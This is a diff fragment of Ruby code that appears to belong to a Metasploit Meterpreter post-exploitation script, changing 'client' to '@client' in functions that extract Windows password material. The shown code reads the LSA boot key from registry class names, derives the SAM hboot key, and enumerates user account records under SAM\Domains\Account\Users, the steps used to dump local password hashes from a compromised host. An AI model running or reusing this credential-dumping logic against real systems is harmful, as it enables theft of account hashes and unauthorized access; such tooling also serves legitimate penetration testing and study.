@@ -47,7 +47,7 @@ def capture_boot_key
 	bootkey = ""
 	basekey = "System\\CurrentControlSet\\Control\\Lsa"
 	%W{JD Skew1 GBG Data}.each do |k|
-		ok = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
+		ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
 		return nil if not ok
 		bootkey << [ok.query_class.to_i(16)].pack("V")
 		ok.close
@@ -67,7 +67,7 @@ def capture_boot_key
 end
 
 def capture_hboot_key(bootkey)
-	ok = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account", KEY_READ)
+	ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account", KEY_READ)
 	return if not ok
 	vf = ok.query_value("F")
 	return if not vf
@@ -86,11 +86,11 @@ end
 
 def capture_user_keys
 	users = {}
-	ok = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users", KEY_READ)
+	ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users", KEY_READ)
 	return if not ok
 
 	ok.enum_key.each do |usr|
-		uk = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{usr}", KEY_READ)
+		uk = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{usr}", KEY_READ)
 		next if usr == 'Names'
 		users[usr.to_i(16)] ||={}
 		users[usr.to_i(16)][:F] = uk.query_value("F").data
@@ -99,9 +99,9 @@ def capture_user_keys
 	end
 	ok.close
 
-	ok = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
+	ok = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
 	ok.enum_key.each do |usr|
-		uk = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
+		uk = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
 		r = uk.query_value("")
 		rid = r.type
 		users[rid] ||= {}
